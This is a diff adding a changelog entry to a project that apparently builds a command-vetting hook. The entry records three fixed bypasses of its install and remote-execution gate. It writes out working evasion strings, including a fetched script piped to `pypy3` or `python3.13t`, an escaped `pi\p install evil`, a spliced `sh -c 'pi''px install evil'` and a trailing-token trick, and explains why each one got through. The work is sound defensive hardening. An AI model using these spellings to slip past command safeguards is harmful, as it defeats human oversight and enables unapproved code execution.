@@ -1,5 +1,102 @@
 # Changelog — Bootstrap Protocol implementation
 
+## Post-2.7.0 — the three X-36 bypasses, closed (2026-08-04)
+
+Issues **#40, #39, #41**, fixed in that order — remote execution first. All
+three were filed off the #36 adversarial review, all three were **pre-existing
+and shipped in `v2.7.0`**, and all three were re-measured against a clean
+install built from the **`v2.7.0` tag archive** before any code changed.
+
+### #40 (X-36d) — one interpreter set, for the pipe trigger *and* the anchor
+
+The interpreter word had **two private spellings** — `alt(INTERPRETERS) +
+"[.0-9]*"` in `interpreter_word()` and `python[0-9.]*` in
+`install_head_tail()` — and both missed the same two real binaries. `pypy3` is
+the stock PyPy binary; `python3.13t` is CPython 3.13's **free-threaded** build,
+which ships under exactly that name.
+
+```
+curl u | pypy3          allow/allow   REMOTE EXECUTION of the fetched bytes
+curl u | python3.13t    allow/allow   same
+pypy3 -m pip install evil  allow/allow   approved-list bypass
+```
+
+`PY_INTERPRETERS` and `INTERP_SUFFIX` in `lib/cmdpos.py` are now the one
+spelling both read. The `t`/`d` ABI tags also join the **basename reduction**
+on both substrates — fixing only the regex would have left the stage
+classifier calling `python3.13t` unmodellable while the trigger matched it,
+which is two spellings of one question all over again.
+
+### #39 (X-36c) — the leftmost install phrase, not the longest match
+
+`sudo pip install evil npx` was rc=0 on both substrates and really installs
+`evil`. bash matches leftmost-**longest**, and the anchor's wrapper arm takes
+flags and positionals without bound, so the run ate `pip install evil` and the
+anchor matched the trailing `npx`; the match covered the whole segment, the
+argument list came back **empty**, and a verb with no arguments reads as a
+lockfile restore. Nothing was inspected.
+
+The shape is *"the segment ends on an install phrase"* — add one token and it
+denied again, blaming the wrong one, which is how every previous corpus missed
+it. **A differential that compares only rc values cannot tell a right answer
+from a right answer for the wrong reason.**
+
+Both substrates now grow a candidate one token at a time and take the **first**
+prefix the anchor matches. The prefix run is deliberately **not** narrowed —
+positionals stay unbounded because `timeout 5 pip install evil` needs them, and
+`cmdpos.py`'s ARITY section records the 16-of-27 regression an arity table
+caused. Only the *choice of match* changed.
+
+That docstring is corrected too. It argued unbounded consumption "cannot fail
+open HERE … the engine backtracks", which is true of **matching** and says
+nothing about **which parse is returned** — and `BASH_REMATCH[0]` / `m.end()`
+is what slices out the argument tokens. The false half is what made this defect
+look impossible.
+
+### #41 (X-36e) — the word bash will actually resolve
+
+Two defects, one cause: the gate judged text bash had already transformed. Both
+were shell-allow / SDK-deny, so **the canonical substrate was the one allowing
+an unapproved install**.
+
+`pi\p install evil` — bash removes quotes and backslashes before resolving a
+word, so `pi\p` names pip, while the hook's `cmd_segments` restores escapes.
+`cmd_word`'s quote-removal half is now `unquote_word` (no basename step, since
+the anchor carries its own path arm) and the anchor's token scan reads through
+it: an existing, tested reduction applied at one more site.
+
+`sh -c 'pi''px install evil'` — adjacent quoted runs are **one word** to bash
+(verified: argv is `[sh][-c][pipx install evil]`), but the invoker rule pushed
+each *run* as its own segment. The spliced word is now pushed as well,
+**additively**, so the change can only add denies.
+
+That second half lives in the shared `_HOOK_HEADER`, which is why
+freeze-exception **no. 38 moves 12/12/16 bodies** rather than two — the same
+body-only-placeholder break as no. 33, and for the same reason.
+
+### Measured
+
+**Acceptance (KB §7):** 461 distinct commands × 2 substrates against a pristine
+`v2.7.0` install. **49 verdicts move allow → deny**; the *previously denied,
+now allowed* set is **empty**. That empty set is what makes the "additive"
+claim about the tokenizer a measurement rather than an argument.
+
+Freeze-exceptions **no. 36, 37 and 38**, each verified per-file first; counts
+stable at 57/69/59 throughout. Suite: **23 suites / 7336 checks / 0 failed**.
+
+**Two `SyntaxWarning` escapes were caught by the project's own guard, not by
+me** — `pi\p` written into a `templates.py` comment and into two emitted
+`gates.py` docstrings are invalid escape sequences. That is the exact trap
+recorded after the #29–#33 batch: invisible locally under a cached `.pyc`,
+fatal in CI. Both guards fired.
+
+**One new residue, X-36g, opened rather than ridden:** `pip install requ\ests`
+is shell-deny / SDK-allow — the SDK more permissive, the direction the contract
+forbids. No fail-open either way (bash resolves it to `requests`, which is
+approved, so the SDK matches bash and the shell over-refuses), but it collides
+head-on with X-34's deliberate rule that a gate consulting an allow list
+refuses decorated spellings. That is an owner call, not a rider.
+
 ## 2.6.1 → 2.7.0 — release identity for the five-issue batch (2026-08-03)
 
 **MINOR.** `PROTOCOL_VERSION` 2.6.1 → 2.7.0 in `lib/installer.py` and
